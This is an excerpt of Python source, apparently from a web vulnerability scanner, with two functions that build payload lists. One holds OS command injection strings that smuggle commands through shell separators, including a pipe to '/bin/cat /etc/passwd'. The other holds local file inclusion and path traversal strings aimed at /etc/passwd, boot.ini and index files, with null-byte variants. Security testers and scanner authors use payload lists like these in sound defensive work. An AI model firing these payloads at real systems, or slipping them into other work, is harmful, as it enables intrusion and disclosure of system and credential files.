...
def os():
	...
	payload = ["%secho \"%s\""%( quote("&") ,r_string(30))]
	payload += ["%secho \"%s\""%(quote("&&"),r_string(30))]
	payload += ["%secho \"%s\""%(quote("|"),r_string(30))]
	payload += ["%secho \"%s\""%(quote(";"),r_string(30))]
	payload += ["%secho \"%s\""%(quote("||"),r_string(30))]
	...
	payload += ["\t\techo \"%s\""%(r_string(30))]
	payload += ["%s\"/bin/cat /etc/passwd\""%quote('|')]
	payload += ["%s\"/etc/passwd\""%quote('|')]
	return payload

def plfi():
	""" Local file Inclusion """
	payload = [r"/etc/passwd%00\\"]
	payload += [r"/etc/passwd"]
	payload += [r"etc/passwd"]
	payload += [r"%00../../../../../../etc/passwd"]
	payload += [r"%00../etc/passwd%00"]
	payload += [r"/./././././././././././boot.ini"]
	payload += [r"/..\../..\../..\../..\../..\../..\../boot.ini"]
	payload += [r"..//..//..//..//..//boot.ini"]
	payload += [r"../../boot.ini"]
	payload += [r"/../../../../../../../../../../../boot.ini%00"]
	payload += [r"/../../../../../../../../../../../boot.ini%00.html"]
	payload += [r"C:/boot.ini"]
	payload += [r"/../../../../../../../../../../etc/passwd^^"]
	payload += [r"/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd"]
	payload += [r"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%"]
	payload += [r"../../../../../../../../../../../../localstart.asp"]
	payload += [r"index.php"]
	payload += [r"../index.php"]
	payload += [r"index.asp"]
	payload += [r"../index.asp"]
